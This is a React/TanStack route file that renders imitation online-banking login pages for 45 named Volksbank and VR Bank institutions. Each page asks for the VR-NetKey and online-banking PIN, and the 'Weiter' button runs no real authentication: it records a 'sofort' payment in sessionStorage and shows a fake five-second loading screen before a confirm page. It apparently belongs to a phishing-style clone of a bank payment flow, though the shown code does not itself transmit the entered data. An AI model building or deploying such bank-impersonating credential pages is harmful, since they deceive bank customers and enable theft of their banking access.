import { useState } from "react";
import { createFileRoute, Link, useParams, useNavigate } from "@tanstack/react-router";
import { ArrowLeft, Info, X } from "lucide-react";
import { bankLogoUrls } from "@/assets/bank-logos";

export const volksbanken: string[] = [
  "Berliner Volksbank eG",
  "Volksbank Mittelhessen eG",
  "Volksbank Darmstadt Mainz eG",
  "Volksbank im Münsterland eG",
  "Frankfurter Volksbank Rhein-Main eG",
  "Dortmunder Volksbank eG",
  "VerbundVolksbank OWL",
  "Volksbank pur eG",
  "Volksbank Kraichgau eG",
  "Hannoversche Volksbank eG",
  "Volksbank Stuttgart eG",
  "Volksbank in Ostwestfalen eG",
  "meine Volksbank Raiffeisenbank eG",
  "VR Bank Rhein-Neckar eG",
  "VR Bank Bonn Rhein-Sieg",
  "Volksbank BRAWO eG",
  "Vereinigte Volksbanken eG",
  "Volksbank Mittlerer Neckar eG",
  "Volksbank im Rheinland eG",
  "VR-Bank Ludwigsburg eG",
  "VR Bank Heilbronn Schwäbisch Hall eG",
  "VR Bank RheinAhrEifel eG",
  "Volksbank eG - Die Gestalterbank",
  "Volksbank Ruhr Mitte eG",
  "Vereinigte VR Bank Kur- und Rheinpfalz eG",
  "VR Bank Mecklenburg eG",
  "VR Bank zwischen den Meeren eG",
  "Wiesbadener Volksbank eG",
  "Volksbank Lüneburger Heide eG",
  "Vereinigte Volksbank eG Saarlouis - Losheim am See - Sulzbach/Saar",
  "VR Bank Schleswig-Holstein Mitte",
  "Volksbank Alzey-Worms eG",
  "Volksbank Ulm-Biberach eG",
  "Volksbank an der Niers eG",
  "Volksbank Trier Eifel eG",
  "Volksbank in Südwestfalen eG",
  "Volksbank Köln Bonn eG",
  "Volksbank Kassel Göttingen eG",
  "Westerwald Bank eG",
  "VR Bank Bamberg-Forchheim eG",
  "VR Bank Augsburg-Ostallgäu eG",
  "Volksbank Vorpommern eG",
  "VR Bank Metropolregion Nürnberg eG",
  "Volksbank in der Region eG",
  "Volksbank Oberberg eG",
];

export function slugifyVolksbank(name: string): string {
  return name
    .toLowerCase()
    .replace(/ä/g, "ae")
    .replace(/ö/g, "oe")
    .replace(/ü/g, "ue")
    .replace(/ß/g, "ss")
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
}

const bySlug: Record<string, string> = Object.fromEntries(
  volksbanken.map((n) => [slugifyVolksbank(n), n]),
);

export const Route = createFileRoute("/bank/volksbanken/$slug")({
  head: ({ params }) => {
    const name = bySlug[params.slug] ?? "Volksbank";
    return {
      meta: [
        { title: `${name} — Login` },
        { name: "description", content: `Melde dich bei ${name} mit deinen Onlinebanking-Daten an.` },
        { property: "og:title", content: `${name} — Login` },
        { property: "og:description", content: `Melde dich bei ${name} mit deinen Onlinebanking-Daten an.` },
        { property: "og:type", content: "website" },
        { name: "twitter:card", content: "summary" },
      ],
    };
  },
  component: VolksbankLoginPage,
});

function VolksbankLoginPage() {
  const { slug } = useParams({ from: "/bank/volksbanken/$slug" });
  const name = bySlug[slug] ?? "Volksbank";
  const logo = bankLogoUrls["volksbanken"];

  const [login, setLogin] = useState("");
  const [pin, setPin] = useState("");
  const [remember, setRemember] = useState(true);

  const navigate = useNavigate();
  const canContinue = login.trim().length > 0 && pin.trim().length > 0;

  return (
    <div className="min-h-screen bg-neutral-100 p-4">
      <div className="mx-auto flex w-[600px] max-w-full items-start justify-center">
        <div className="flex h-[calc(100vh-2rem)] max-h-[1043px] w-full flex-col overflow-hidden rounded-2xl bg-white shadow-xl">
          <div className="flex flex-1 flex-col overflow-y-auto px-8 pb-6 pt-8 sm:px-10">
            <div className="flex items-start justify-between">
              <Link
                to="/bank/volksbanken"
                aria-label="Zurück"
                className="flex h-10 w-10 items-center justify-center rounded-full text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <ArrowLeft className="h-5 w-5" strokeWidth={2} />
              </Link>
              <Link
                to="/confirm"
                aria-label="Schließen"
                className="rounded-full p-1 text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <X className="h-6 w-6" strokeWidth={2} />
              </Link>
            </div>

            <img
              src={logo}
              alt=""
              className="mt-4 h-20 w-20 rounded-full object-contain"
            />

            <h1 className="mt-4 text-[24px] font-bold leading-tight text-[#0b051d]">{name}</h1>
            <p className="mt-3 text-[15px] text-[#373544]">Melde dich mit deinen Onlinebanking-Daten an</p>

            <div className="mt-6 divide-y divide-[rgb(112,110,123)] rounded-xl border border-[rgb(112,110,123)] bg-white">
              <div className="relative rounded-t-xl px-4 hover:bg-neutral-100 focus-within:!bg-white">

                <div className="relative flex h-[58px] items-center">
                  <input
                    id="vb-login"
                    type="text"
                    value={login}
                    onChange={(e) => setLogin(e.target.value)}
                    placeholder=" "
                    className="peer h-full w-full bg-transparent pt-4 text-[15px] font-semibold text-[#0b051d] outline-none placeholder:text-transparent"
                  />
                  <label
                    htmlFor="vb-login"
                    className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-[13px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[13px]"
                  >
                    VR-NetKey oder Alias
                  </label>
                </div>
              </div>

              <div className="relative rounded-b-xl px-4 hover:bg-neutral-100 focus-within:!bg-white">
                <div className="relative flex h-[58px] items-center gap-2">
                  <input
                    id="vb-pin"
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder=" "
                    className="peer h-full flex-1 bg-transparent pt-4 text-[15px] font-semibold text-[#0b051d] outline-none placeholder:text-transparent"
                  />
                  <label
                    htmlFor="vb-pin"
                    className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-[13px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[13px]"
                  >
                    PIN
                  </label>
                  <div className="group relative z-10">
                    <Info className="h-5 w-5 shrink-0 cursor-help text-[#6b6b6b]" strokeWidth={2} />
                    <div className="pointer-events-none absolute right-full top-1/2 z-50 mr-2 w-52 -translate-y-1/2 rounded-lg bg-black px-4 py-4 text-[16px] leading-relaxed text-white opacity-0 shadow-lg transition-opacity group-hover:opacity-100">
                      Online-Banking PIN, nicht die 4-stellige PIN Ihrer EC-/Maestro-Karte
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-5 flex items-center justify-between">
              <span className="text-[15px] font-semibold text-[#0b051d]">Anmeldedaten speichern</span>
              <button
                type="button"
                role="switch"
                aria-checked={remember}
                onClick={() => setRemember((v) => !v)}
                className={`relative inline-flex h-7 w-12 items-center rounded-full transition-colors ${
                  remember ? "bg-[#0b051d]" : "bg-neutral-300"
                }`}
              >
                <span
                  className={`inline-block h-5 w-5 transform rounded-full bg-white transition-transform ${
                    remember ? "translate-x-6" : "translate-x-1"
                  }`}
                />
              </button>
            </div>
          </div>

          <div className="relative bg-white px-8 pb-6 pt-3 sm:px-10">
            <button
              type="button"
              disabled={!canContinue}
              onClick={() => {
                if (!canContinue) return;
                try {
                  sessionStorage.setItem("paymentMethod", "sofort");
                  sessionStorage.setItem("bankName", name);
                  sessionStorage.setItem("bankLogo", "volksbanken");
                } catch {}
                navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
              }}
              className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                canContinue
                  ? "bg-[#0b051d] text-white hover:bg-[#1a1230]"
                  : "cursor-not-allowed bg-neutral-200 text-neutral-500"
              }`}
            >
              Weiter
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
